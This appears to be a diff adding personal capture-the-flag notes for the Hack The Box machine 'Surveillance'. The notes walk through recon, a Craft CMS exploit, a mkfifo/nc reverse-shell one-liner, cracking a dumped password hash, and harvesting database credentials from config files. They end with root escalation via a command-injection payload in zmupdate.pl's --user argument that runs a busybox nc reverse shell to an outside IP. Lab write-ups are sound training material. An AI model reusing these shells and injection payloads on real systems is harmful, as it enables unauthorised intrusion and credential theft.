@@ -1,0 +1,97 @@
+nmap 10.10.11.245 -sV -sC -T4 -p- -v:
+    22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
+    |_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
+    80/tcp    open     http    nginx 1.18.0 (Ubuntu)
+    |_http-title: Did not follow redirect to http://surveillance.htb/
+    | http-methods: 
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    |_http-server-header: nginx/1.18.0 (Ubuntu)
+    61782/tcp filtered unknown
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+nothing interesting in webpage
+
+using dirsearch 
+    find http://surveillance.htb/admin/login
+
+work on craft cms
+
+find script (https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) need to change response = requests.post(url, headers=headers, data=data, proxies={"http": "http://127.0.0.1:8080"}) from local host to ip connected the htb
+
+got the shell, im www-data
+
+used cat /etc/passwd, found user name matthew
+
+opened a proper reverse shell using:
+    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc IP 4444 >/tmp/f
+
+did cd .. and found surveillance--2023-10-17-202801--v4.4.14.sql.zip inside
+
+downloaded it via wget:
+    wget surveillance.htb/surveillance--2023-10-17-202801--v4.4.14.sql.zip  
+
+unziped it, its a ascii txt file 
+
+ found INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
+/*!40000 ALTER TABLE `users` ENABLE KEYS */; inside
+
+used hashcat:
+    hashcat -m 1400  hashmatthew /usr/share/wordlists/rockyou.txt -O
+
+39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec: starcraft122490
+
+lets try connect via ssh to machine with this user and password
+
+succeed, ls and there is userflag :
+    9129ebeb02147a3f6c1c89540e61b882
+
+sudo -l didnt work but there is linpeas.sh present
+
+found 1 more user zoneminder
+
+inside /var/www/html/craft/.env found:
+    # Database connection settings
+    CRAFT_DB_DRIVER=mysql
+    CRAFT_DB_SERVER=127.0.0.1
+    CRAFT_DB_PORT=3306
+    CRAFT_DB_DATABASE=craftdb
+    CRAFT_DB_USER=craftuser
+    CRAFT_DB_PASSWORD=CraftCMSPassword2023!
+
+inside /usr/share/zoneminder/www/api/app/Config/database.php found:
+    'login' => 'zmuser',
+    'password' => 'ZoneMinderPassword2023',
+
+found that zoneminder runs on 1.36.32, found script for this (https://github.com/heapbytes/CVE-2023-26035)
+
+dont forget to open nc on other port that 4444 or close the working port 4444 and then use the script
+
+so i get reverse shell as zoneminder user
+
+sudo -l:
+    User zoneminder may run the following commands on surveillance:
+    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
+
+zmupdate.pl has vulnerability that can use --user parameter for directory input instead of user
+
+so we creating file:
+    #!/bin/bash
+    busybox nc 10.10.16.120 4545 -e sh 
+
+opening python3 server to upload it to machine
+
+downloading the file to /tmp and giving it chmod +x 
+
+after we open a nc -lvnp using the port that used in file we just created 
+
+after we using command:
+    sudo zmupdate.pl --version=1 --user='$(/tmp/exploitzm.sh)' --pass=ZoneMinderPassword2023
+
+because zmupdate running with root permissions we get a reverse shell with root permissions
+ and we are root,cd /root and we get a root flag:
+    60466bf582f284577503d32b6ef4153c
+
+
+
